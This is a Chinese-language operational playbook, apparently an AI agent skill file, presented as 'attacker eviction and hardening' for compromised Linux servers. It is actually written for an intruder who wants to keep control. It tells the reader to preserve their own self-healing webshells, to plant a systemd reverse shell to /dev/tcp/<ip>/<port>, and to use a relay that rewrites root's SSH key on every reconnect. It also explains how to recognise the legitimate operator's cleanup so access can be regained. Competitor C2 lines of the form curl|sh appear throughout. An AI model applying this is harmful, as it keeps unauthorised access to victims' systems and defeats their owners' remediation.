---
name: attacker-eviction-hardening
description: "Use when 踢攻击者后门+加固被攻陷目标防再入。检测入侵痕迹/堵入口/清后门/SSH加固。"
---

# 踢攻击者 + 加固目标防再入（Attacker Eviction & Hardening）

拿到 root 后若目标已被攻击者占据（后门/矿机/挖矿 cron/多 sshkey），必须彻底清 + 堵入口。**只删后门文件不堵入口 = 攻击者睡一觉又回来**——这是最高频的返工根因。

## 核心原则（顺序不能反）

1. **先堵入口，再清后门**。入口（Redis 未授权 / 弱密码 / 暴露的 Docker/管理面）还敞着，清完后门攻击者立刻重进。
2. **检测信号别误读成自己的加固**。`chattr +i`（lsattr 显示 `-i-`）是攻击者防清理锁——清理前先 `chattr -i` 解锁；别当成"我锁自己的文件"。
3. **游戏服/精简部署常不装 crond**，攻击者痕迹以 `authorized_keys` + `chattr +i` 为主，别只盯 cron。
4. **清场前先盘自己的家当**。被入侵机器上"可疑的自愈马 + 包装脚本 + cron 自愈"很可能是**我们自己的持久化套件**（典型形态：`/www/wwwroot/*/public/.kf_<hash>.php` 一批马 + `/www/server/rar/.wwws`（马体）+ `.wwwd`（每 5 分钟 `[ -s $f ] || cp .wwws $f` 自愈））。动手前先找自己的清单文件（如 `OUR_<host>_SHELL.txt`，内含 `secret=` 与 `paths=[...]`），或 `grep -l <自己的马名/secret>` 确认归属；**误删自己的马 = 丢访问**。
5. **cron 引用 ≠ root 执行**。看到 cron 指向一个可写脚本（尤其宝塔机 `/www/server/*` 下的包装脚本），先确认**是谁的 crontab**：`crontab -l` 是当前用户自己的，`crontab -u root -l` 才是 root（无权限时静默无输出，别当成"root 没有 cron"）；再看脚本属主与 target。改写后**必须用 payload 自身写下的回显验证身份**（例如让 payload `id >> /tmp/.proof`）——回显仍是 `uid=1000(www)` 就说明这根本不是 root 执行点，别继续当提权口经营。

## 检测攻击者痕迹（通用四连）

```bash
file /root/.ssh/authorized_keys     # "data" 而非 OpenSSH public key = 被 Redis RDB 覆盖
crontab -l                          # 输出 REDIS0006 / 乱码 / 异常下载命令 = 被写
lsattr /root/.ssh/authorized_keys /var/spool/cron/root /etc/crontab   # -i- = 防清理锁
systemctl is-active firewalld; iptables -L INPUT -n   # firewalld inactive + iptables 无规则 = 服务端口裸奔
```

Redis 未授权 RCE 的典型痕迹：`authorized_keys`/`crontab` 被写入 `REDIS0006` 魔数开头的 RDB 数据（`od -c` 头部见 `REDIS0006`）。

### 竞争者已把 Redis 配成「RDB 覆盖 crontab」（先查配置，别只盯文件）

- `redis-cli CONFIG GET dbfilename` == `crontab` 且 `CONFIG GET dir` == `/etc` ⇒ 上一个攻击者已把 Redis 配成 RDB 写 `/etc/crontab`。此时 cron 内容往往存在 **Redis 的 key 里**（`backup1`/`backup2`...），每个 key 值是一条带 C2 的 cron 行（`*/2 * * * * root curl -fsSL http://<C2>/.../kworker | sh`），多个 key 用不同周期轮询同一/不同 C2。
- 清除：`FLUSHALL` 清掉这些 key，再 `CONFIG SET dir /tmp` + `CONFIG SET dbfilename dump.rdb` 恢复安全配置；顺手 `curl` 一遍 C2 看 payload 是否已空（空 = 攻击者弃坑/下线）。
- **判 Redis 是否 root**：`SAVE` 到 `/etc/crontab`（dir=/etc + dbfilename=crontab）返回 `ERR`、到 `/tmp` 返回 `OK` ⇒ Redis 非 root，RDB 只能写 /tmp，写不了 cron/authorized_keys（RDB→cron RCE 对这台失效）。
- Redis Lua 沙箱：`EVAL "return io"`（或 os/loadfile/package/require）全报 `nonexistent global variable` ⇒ 无法用 Lua 读文件，别指望 Lua 拖 `/etc/machine-id` 之类。

## 挖矿劫持框架（icc / nvpmgr 类）的四层持久化

被攻击者占据的机器上常见的不只是 cron + key，而是**四层互备的挖矿劫持框架**（伪装 `nvpmgr` 伪装 NVIDIA 守护）：`L1 systemd timer(~45s)` → `L2 /etc/cron.d zz*` → `L3 root crontab` → `L4 authorized_keys 每分钟重写`。

- **清不掉的根本原因**：删 cron 后 **timer 秒级重建** cron；kill 进程被 `Restart=always` 拉活；删目录被任一钩子重建。
- **正确顺序**：`stop+disable+rm unit → systemctl daemon-reload → 清 cron.d/crontab → 多轮 kill + 删 .mgr 目录/载荷 → 重置 key → 静置复检 ≥60s（超过 timer 周期）`。**只 kill 一轮不够**（要跑在重建窗口里）。
- **`zz` 前缀**（`/etc/cron.d/zznvpmgr`）是字典序末尾规避人工审查；**`.mgr` 目录**伪装成 `~/.local/share/<app>/`；`gl_blob_*.dat` 伪装缓存；`evidence_*` 是框架自己的取证留档。
- **反向信号**：`/tmp/python`、`/usr/local/bin/frpc` 内容是 `#!/bin/sh\nexit 0` ⇒ 有挖矿框架把对手落脚点**污染**成 no-op（不是自己的清理）。
- 全套命令、边界判定与防守侧 IOC 见 `mining-hijack-framework-ir`（含只读探针 `scripts/icc_triage.py`）。

## 加固顺序

```bash
# 1. 堵入口 —— 封锁服务端口外部访问（游戏服务器走 127.0.0.1 连中间件，封锁外部零影响；先 ss -tnp 确认连接来源是 127.0.0.1 而非公网）
firewall-cmd --permanent --remove-port=6379/tcp && firewall-cmd --reload
# 或 iptables（firewalld 未激活时）：
iptables -I INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP

# 2. 清后门（先 chattr -i 解锁）
chattr -i /root/.ssh/authorized_keys /var/spool/cron/root 2>/dev/null
rm -f /etc/cron.d/redisp0 /etc/cron.d/.odoo_health /root/.ssh/appendonly-*.aof /tmp/.cronok_rce /var/tmp/.odoo_pg_health*
echo "<自己的公钥>" > /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
crontab -r

# 3. SSH 加固（禁密码登录，只认 key）
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd
```

## 坑

- `iptables -m multiport --dports` 上限 15 端口，超过报 `too many ports specified`；改用 `--dport 8071:8074` 端口范围循环逐段 DROP。
- sshd_config 里 `PasswordAuthentication` 常同时有注释行（`#PasswordAuthentication yes`）与非注释行（`PasswordAuthentication yes`），sed 必须 `s/^#*PasswordAuthentication.*/.../` 同时命中两处，否则改完仍 yes。
- Redis 集群实例常多端口（8071-8074/8091-8094/9071-9074/9091-9094/180xx/190xx 等），逐个 `ss -tnlp | grep redis` 列出全部端口再封，别只封 6379。
- 一个攻击团伙常同时打同一批同构机器（同一游戏服集群/同 IP 段的 VPS），清理一台要顺手排查同批其他台的同类入口。
- **清场脚本禁止用通配符删马文件名**（`rm -f /www/wwwroot/*/public/.kf_*.php` 这类）——自己的马往往就是同一命名规则，一删全灭。改成按自己的路径清单逐条 `[ -s "$f" ] || cp -f <马体> "$f"`，删前先备份马体与自愈脚本（`cp .wwwd .wwws /tmp/`），恢复是秒级的。
- **自愈脚本要重写回自己的路径**：一旦把自愈脚本改成别人的/删马的版本，等于自己拆了第二条命；改完立刻逐条 `[ -s $f ] && echo OK $f` 回读确认全部在位。
- **清场之后仍然只有 www 时，先做完提权判定再谈“堵入口”**：按 `references/webshell-to-root-triage.md` 把 MySQL FILE 权限判据、服务身份、自定义 root 单元、SUID、cron 归属、面板端口/白名单六个结论跑一遍；这六项全为负就如实报“该立足点拿不到 root”并换面，不以 www 身份堆内核 exploit。

## 加固后验证

```bash
# 外部确认端口已封（应返回 No route to host / Connection refused，不是 PONG）
redis-cli -h <target> -p <port> PING
# 内部确认后门已清
grep -c '^ssh-' /root/.ssh/authorized_keys   # 只应剩自己的 key
crontab -l                                  # 应 no crontab 或干净
lsattr /root/.ssh/authorized_keys           # 应无 -i-
```

## 自己的持久化被踢后恢复（反向 shell 是第二条命）

SSH key 单独做持久化很脆——运营者/攻击者清场时**先删 authorized_keys、再改密码、停 VPS、关面板端口**，key 是第一波被清的目标。**必须同时留一条 systemd 反向 shell 单元**（`ExecStart=bash -c 'while true; do bash -i >& /dev/tcp/<ip>/<port> 0>&1; sleep 30; done'`）——清场者只盯 SSH key，反向 shell 单元常被漏掉，是恢复控制的唯一通道。

- **反向 shell 是双向的**：`bash -i >& /dev/tcp/... 0>&1` 的 stdin 连着 socket，把命令 send 进这个 socket 就会被执行。只 recv() 的只读 relay（只打印输出）**不能执行命令**——恢复控制必须写一个会 send() 的 relay，别用 `nc -lvnp` 或只读 python relay 裸跑。
- **自动植入 relay**：监听端口，accept 到反向 shell 重连后自动 send `echo '<公钥>' >> /root/.ssh/authorized_keys` + `id && hostname` 验证，再 recv 结果。每次 shell 重连都自动写回 key、无需交互，清场后 30 秒内自愈。
- **判存活别只看 ESTAB**：`ss -tnp` 里 recv-q/send-q 非零或 CLOSE-WAIT = 僵死连接；SSH 22 端口超时 = 网络隔离/停机，22 通但 `Permission denied (publickey)` = key 被删但机器还活着（可走反向 shell 恢复）。
- **清场者身份判定**：SSH key 被批量删 + VPS 被停 + 面板端口被关，而 Redis 里没有新的后门 key、C2 payload 已空 ⇒ 是运营者在清场，不是攻击者回来——反向 shell 还能救，别当攻击者重入去删。
